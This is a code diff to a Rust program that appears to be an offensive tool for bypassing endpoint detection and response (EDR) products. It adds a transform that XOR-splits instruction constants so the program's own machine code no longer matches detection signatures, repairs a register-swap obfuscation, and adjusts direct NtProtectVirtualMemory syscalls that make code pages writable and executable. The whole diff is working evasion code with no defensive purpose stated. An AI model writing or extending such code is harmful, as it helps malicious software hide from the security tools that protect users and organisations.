@@ -163,13 +163,6 @@ static SIGNATURE_DATABASE: &[KnownSignature] = &[
         severity: "medium",
     },
     KnownSignature {
-        name: "mov_r10_rcx_mov_eax",
-        // 4C 8B D1 B8 = mov r10, rcx; mov eax, ...
-        // Variant with different encoding
-        pattern: &[0x4C, 0x8B, 0xD1, 0xB8],
-        severity: "high",
-    },
-    KnownSignature {
         name: "ntcreatefile_pattern",
         // Pattern typical of NtCreateFile syscall stubs
         pattern: &[0xB8, 0x55, 0x00, 0x00, 0x00],
@@ -573,15 +566,19 @@ fn transform_register_swap_rax_rcx(text: &mut [u8], excluded: &[bool]) -> Vec<Tr
             false
         };
 
-        let (after, size_delta) = if xchg_written {
-            // Record the full 12-byte replacement (mov rcx + xchg).
-            (text[offset..offset + 12].to_vec(), 2)
-        } else {
-            // No room for xchg — just the register rename (rax→rcx only).
-            // Note: without xchg the value lands in rcx instead of rax,
-            // so this is only safe if nothing reads rax afterwards.
-            (text[offset..offset + 10].to_vec(), 0)
-        };
+        if !xchg_written {
+            // No room for xchg — skip this transformation entirely.
+            // Changing mov rax -> mov rcx without the xchg would corrupt
+            // any downstream code that reads rax, since the value would
+            // land in rcx instead. Without liveness analysis, we cannot
+            // safely apply a partial transformation.
+            // Restore the original opcode before skipping.
+            text[offset + 1] = 0xB8;
+            continue;
+        }
+
+        let after = text[offset..offset + 12].to_vec();
+        let size_delta = 2;
 
         records.push(TransformRecord {
             offset,
@@ -589,6 +586,113 @@ fn transform_register_swap_rax_rcx(text: &mut [u8], excluded: &[bool]) -> Vec<Tr
             before_hex: hex_encode(&before),
             after_hex: hex_encode(&after),
             size_delta,
+        });
+        count += 1;
+    }
+    records
+}
+
+/// Apply constant splitting: `mov rax, imm64` → XOR-encoded via rcx.
+///
+/// For `mov rax, imm64` (48 B8 …) instructions where the upper 32 bits of
+/// the immediate are zero (common on Windows for addresses and syscall numbers
+/// in the low 4 GB), replaces the instruction with:
+///
+/// ```text
+///   mov rcx, (original_lo32 ^ key)  ; 48 B9 XX XX XX XX 00 00 00 00  (10 bytes)
+///   xor rcx, key                    ; 48 81 F1 KK KK KK KK            ( 7 bytes)
+///   xchg rax, rcx                   ; 48 91                           ( 2 bytes)
+/// ```
+///
+/// After execution, `rax` holds the original value and `rcx` is clobbered.
+/// Total footprint: 19 bytes, but we reuse the 10-byte original + up to 9
+/// bytes of trailing NOP/CC padding.
+///
+/// If fewer than 9 bytes of padding are available, the transform is skipped
+/// for that location (falling back to `transform_register_swap_rax_rcx`
+/// which needs only 2 bytes).
+///
+/// The XOR key is a random non-zero 32-bit value, regenerated per hit.
+fn transform_constant_splitting(text: &mut [u8], excluded: &[bool]) -> Vec<TransformRecord> {
+    let mut records = Vec::new();
+    let mut rng = rand::thread_rng();
+
+    // Look for: 48 B8 XX XX XX XX XX XX XX XX (mov rax, imm64) — 10 bytes
+    let offsets = find_pattern_offsets(&text[..text.len().saturating_sub(10)], &[0x48, 0xB8]);
+
+    let max_splits = 3usize;
+    let mut count = 0;
+
+    for offset in offsets {
+        if count >= max_splits {
+            break;
+        }
+        // Need 10 (original) + 9 (xor + xchg) = 19 bytes total.
+        if offset + 19 > text.len() {
+            continue;
+        }
+        if excluded.get(offset..offset + 19).map_or(true, |z| z.iter().any(|&x| x)) {
+            continue;
+        }
+
+        // Read the immediate value.
+        let imm_bytes = &text[offset + 2..offset + 10];
+        let imm_val = u64::from_le_bytes(imm_bytes.try_into().unwrap_or([0; 8]));
+
+        // Only split when upper 32 bits are zero (value fits in 32 bits).
+        if imm_val >> 32 != 0 {
+            continue;
+        }
+        // Skip trivially small values.
+        if imm_val < 0x100 {
+            continue;
+        }
+
+        // Check that bytes 10–18 after the instruction are NOP/CC padding.
+        let padding = &text[offset + 10..offset + 19];
+        if !padding.iter().all(|&b| b == 0x90 || b == 0xCC) {
+            continue;
+        }
+
+        // Generate a non-zero random XOR key.
+        let key: u32 = loop {
+            let k = rng.gen();
+            if k != 0 {
+                break k;
+            }
+        };
+        let lo32 = imm_val as u32;
+        let encoded = lo32 ^ key;
+
+        let before = text[offset..offset + 19].to_vec();
+
+        // Instruction 1: mov rcx, (lo32 ^ key) with upper 32 bits zero.
+        // 48 B9 EE EE EE EE 00 00 00 00  (10 bytes)
+        text[offset] = 0x48;
+        text[offset + 1] = 0xB9; // B9 = mov rcx, imm64
+        text[offset + 2..offset + 6].copy_from_slice(&encoded.to_le_bytes());
+        text[offset + 6..offset + 10].copy_from_slice(&[0u8; 4]); // upper 32 = 0
+
+        // Instruction 2: xor rcx, key
+        // 48 81 F1 KK KK KK KK  (7 bytes)
+        text[offset + 10] = 0x48;
+        text[offset + 11] = 0x81;
+        text[offset + 12] = 0xF1; // ModRM: xor rcx, imm32
+        text[offset + 13..offset + 17].copy_from_slice(&key.to_le_bytes());
+
+        // Instruction 3: xchg rax, rcx
+        // 48 91  (2 bytes)
+        text[offset + 17] = 0x48;
+        text[offset + 18] = 0x91; // xchg rax, rcx
+
+        let after = text[offset..offset + 19].to_vec();
+
+        records.push(TransformRecord {
+            offset,
+            transform_type: "constant_splitting".to_string(),
+            before_hex: hex_encode(&before),
+            after_hex: hex_encode(&after),
+            size_delta: 9, // 19 - 10 original bytes consumed from padding
         });
         count += 1;
     }
@@ -693,7 +797,7 @@ unsafe fn make_region_writable(base: usize, size: usize) -> Result<u32> {
     let mut old_protect: u32 = 0;
     let status = syscall!(
         "NtProtectVirtualMemory",
-        std::ptr::null_mut::<std::ffi::c_void>(), // process handle (current)
+        (-1i64) as u64, // NtCurrentProcess()
         &mut (base as *mut std::ffi::c_void),
         &mut (size as usize),
         0x40u32, // PAGE_EXECUTE_READWRITE
@@ -713,7 +817,7 @@ unsafe fn restore_protection(base: usize, size: usize, original: u32) -> Result<
     let mut old_protect: u32 = 0;
     let status = syscall!(
         "NtProtectVirtualMemory",
-        std::ptr::null_mut::<std::ffi::c_void>(),
+        (-1i64) as u64, // NtCurrentProcess()
         &mut (base as *mut std::ffi::c_void),
         &mut (size as usize),
         original,
@@ -844,6 +948,16 @@ pub fn run_edr_bypass_transform(max_transforms: u32, entropy_threshold: f64) -> 
     // 4. Register swap (rax↔rcx).
     if applied < max_transforms {
         let recs = transform_register_swap_rax_rcx(text_mut, &excluded);
+        for r in &recs {
+            log::debug!("edr_bypass_transform: applied {} at offset {}", r.transform_type, r.offset);
+        }
+        applied += recs.len() as u32;
+        all_transforms.extend(recs);
+    }
+
+    // 4.5. Constant splitting (XOR-encoded mov rax, imm64).
+    if applied < max_transforms {
+        let recs = transform_constant_splitting(text_mut, &excluded);
         for r in &recs {
             log::debug!("edr_bypass_transform: applied {} at offset {}", r.transform_type, r.offset);
         }
